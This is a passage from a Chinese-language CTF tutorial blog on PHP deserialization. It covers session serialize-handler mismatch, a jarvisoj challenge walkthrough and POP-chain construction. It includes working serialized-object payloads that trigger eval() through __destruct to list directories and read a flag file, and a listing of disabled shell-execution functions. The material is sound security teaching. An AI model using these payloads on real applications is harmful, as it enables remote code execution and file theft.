class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Shield(pctf.php);<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<blockquote>
<p>index.php?class=O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p>
</blockquote>
<h2 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h2><blockquote>
<p> 当session_start()被调用或者php.ini中session.auto_start = 1时，PHP内部调用会话管理器，将用户session序列化以后，存储到指定目录（默认为/tmp）</p>
</blockquote>
<h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/07/10/.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="ini中相关的配置"><a href="#ini中相关的配置" class="headerlink" title="ini中相关的配置"></a>ini中相关的配置</h3><p>配置文件php.ini中含有session的相关配置</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--设置session的存储路径,默认在/tmp</span><br><span class="hljs-keyword">session</span>.auto_start   <span class="hljs-comment">--指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="hljs-keyword">session</span>.serialize_handler   <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认使用phpsession.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，比如files就是session默认以文件的方式进行存储</span><br></code></pre></td></tr></table></figure>

<h3 id="代码中引擎设置"><a href="#代码中引擎设置" class="headerlink" title="代码中引擎设置"></a>代码中引擎设置</h3><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码</p>
<p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br></code></pre></td></tr></table></figure>

<h3 id="不同引擎存储差异"><a href="#不同引擎存储差异" class="headerlink" title="不同引擎存储差异"></a>不同引擎存储差异</h3><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值，文件位置在ini的<code>session.save_path</code>中 [/Extensions/tmp/tmp(phpstudy)]。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>当<code>session.serialize_handler</code>为<code>php</code>时</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li>当<code>session.serialize_handler</code>为<code>php_serialize</code>时</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>当<code>session.serialize_handler</code>为<code>php_binary</code>时</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-number">0x04</span>&gt;names:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure>

<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如果 PHP 在反序列化存储的 $_SESSION  数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。常见的比如存入session时用的处理器为php_serialize,反序列化时用的处理器是php</p>
<p><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p>
<p>常见的比如存入session时用的处理器为php_serialize，反序列化时用的处理器是php</p>
<blockquote>
<p>当配置选项session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题</p>
<p>当配置选项session.auto_start＝On会自动注册Session会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在session.auto_start＝On时，销毁自动生成的Session会话，然后设置需要的序列化处理器，再调用session_start()函数注册会话，这时如果脚本中设置的序列化处理器与php.ini中设置的不同，就会出现安全问题,因为PHP自动注册Session会话是在脚本执行前，所以通过该方式只能注入PHP的内置类</p>
</blockquote>
<p>比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>上面的 $_SESSION 数据 在存储时使用的序列化处理器为 php_serialize 存储的格式如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ryat&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span><span class="hljs-built_in">stdClass</span><span class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>在读取数据时如果用的反序列化处理器不是php_serialize 而是php 的话 那么反序列化后的数据将会变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!php</span><br><span class="hljs-comment">// var_dump($_SESSION);</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:4:&quot;</span>ryat<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>

<p>则反序列化后还原得到一个新的对象 通过注入 <code>|</code> 字符伪造了对象的序列化数据</p>
<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s2.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先访问一下s2 应为空</p>
<p>接着访问<code>s1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code></p>
<p>然后访问一下s2 回显spoock</p>
<p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化。 此时访问us2.php时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问us2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，实例化lemon对象，session反序列化会执行里面销毁前的魔术函数<code>__destruct()</code>，前面的<code>__construct()</code>就不再执行了。</p>
<h3 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h3><h4 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h4><p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>存在<code>ini_set(‘session.serialize_handler’, ‘php’)</code>，暂时没找到用php_serialize添加session的方法，但get传入phpinfo时会实例化<code>OowoO</code>这个类并可以查看phpinfo</p>
<blockquote>
<p>index.php?phpinfo</p>
</blockquote>
<p>disable_function</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,<span class="hljs-keyword">chmod</span>,set_time_limit,<span class="hljs-keyword">chroot</span>,error_log,pfsockopen,syslog,<span class="hljs-keyword">symlink</span>,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/07/12/.png" srcset="/img/loading.gif" lazyload></p>
<p><code>session.upload_progress.enabled</code>为On。<code>session.upload_progress.enabled</code>本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中<code>session.upload_progress.name</code>同名的变量时（<code>session.upload_progress.name</code>的变量值默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code>），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
<p>首先 先构造一个文件上传</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>接着搞反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-variable">$a</span>-&gt;mdzz=<span class="hljs-string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;<br><span class="hljs-comment">//$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;__dir__&#x27;));&quot;;</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>防止转义，在引号前面加上\得到<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210715000429267.png" srcset="/img/loading.gif" lazyload></p>
<p>在phpinfo得知根目录为<code>DOCUMENT_ROOT:/opt/lampp/htdocs</code></p>
<p>修改传引用为<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></p>
<p>同样的方法得到payload：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210715001047516.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><p>面向属性编程（Property-Oriented Programing）  用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented  Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
<p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP  链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br> 二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p>
<h3 id="Autoloading"><a href="#Autoloading" class="headerlink" title="Autoloading"></a>Autoloading</h3><p>传统的PHP要求应用程序导入每个类中的所有类文件，这样就意味着每个PHP文件需要一列长长的include或require方法，而在当前主流的PHP框架中，都采用了Autoloading自动加载类来完成这样繁重的工作。在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。Composer默认是从Packagist来下载依赖库的。<br>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p>
<p>1.从可能存在漏洞的依赖库文件入手   可以使用代码审计工具或者全局手动搜索__wakeup()和__destruct()   </p>
<p>在composer.json中存在以下组件就要引起注意了</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">任意写<br><span class="hljs-variable">monolog</span>/<span class="hljs-function"><span class="hljs-title">monolog</span>(&lt;<span class="hljs-number">1.11</span>.<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">guzzlehttp</span>/<span class="hljs-variable">guzzle</span><br><span class="hljs-variable">guzzle</span>/<span class="hljs-variable">guzzle</span><br>任意删除<br><span class="hljs-variable">swiftmailer</span>/<span class="hljs-variable">swiftmailer</span><br></code></pre></td></tr></table></figure>

<p>2.从应用的代码框架的逻辑上入手</p>
<p>3.从PHP语言本身漏洞入手</p>
<h3 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h3><p>有两种情形：</p>
<ul>
<li>在PHP魔术方法中出现缺陷代码，自动调用而触发漏洞</li>
<li>缺陷代码不在魔术方法中，而是在一个类的普通方法中。这时候就要寻找相同的函数名，将类的属性和敏感函数(能背利用的同名函数)的属性联系起来。</li>
</ul>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p>
<ol>
<li><p><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</p>
</li>
<li><p>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</p>
</li>
<li><p>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</p>
</li>
